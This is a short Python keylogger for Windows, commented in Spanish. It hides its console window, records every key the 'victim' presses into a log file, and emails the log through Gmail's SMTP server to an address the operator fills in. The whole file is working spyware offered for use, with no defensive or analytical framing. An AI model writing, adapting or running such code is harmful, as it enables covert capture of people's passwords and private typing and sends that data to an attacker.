import win32console
import win32gui 
import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#Para que este en segundo plano o no se vea#
ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana, 0)

#Abrir el archivo y sino existe lo crea#
log_file = open("log.txt", "w+")

def enviar_datos():
    msg = MIMEMultipart()
    password = "" #Contraseña del correo#
    msg['From'] = "" #Aca es desde donde se va enviar la informacion (debe ser un correo)#
    msg['To'] = "" #Correo a donde va llegar la informacion (recomendado ser el mismo correo)#
    msg['Subject'] = "Keylogger Data" #Asunto del correo#
    msg.attach(MIMEText(open('log.txt').read())) #Abre el archivo y su info#
    #Capturar errores#
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'], password)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
    except:
        print("Error al enviar el correo") #Capturar errores si no da
#Funciones
def presiona(key):
    key1 = convert(key)
    if key1 == "Key.esc": #Si la victima presiona 'esc' se termina el proceso#
        print("Saliendo...")
        imprimir()
        return False
    elif key1 == "Key.space":
        lista_teclas.append(" ")
    elif key1 == "Key.enter":
        lista_teclas.append("\n")
    elif key1 == "Key.backspace":
        lista_teclas.pop()
    elif key1 == "Key.shift":
        pass
        #lista_teclas.append(" ")
    elif key1 == "Key.ctrl":
        pass
        #lista_teclas.append(" ")
    elif key1 == "Key.alt":
        pass
        #lista_teclas.append(" ")
    else:
        lista_teclas.append(key1)

#ESTO ES PARA DARNOS CUENTA CUANDO SUELTA LA TECLA PRESIONADA PERO NO ES NECESARIO PARA EL SCRIPT
# def libera(key):
#     key1 = convert(key)
#     print("Tecla liberada: {0}".format(key1))
#     if key == pynput.keyboard.Key.esc:
#         print("Saliendo...")
#         return False

def imprimir():
    teclas = ''.join(lista_teclas)
    log_file.write(teclas)
    log_file.write("\n")
    log_file.close()
    time.sleep(5)
    enviar_datos()
#Aca es donde van las teclas presionadas por la victima#
lista_teclas = []

def convert(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

with pynput.keyboard.Listener(on_press=presiona) as listener:
    listener.join()
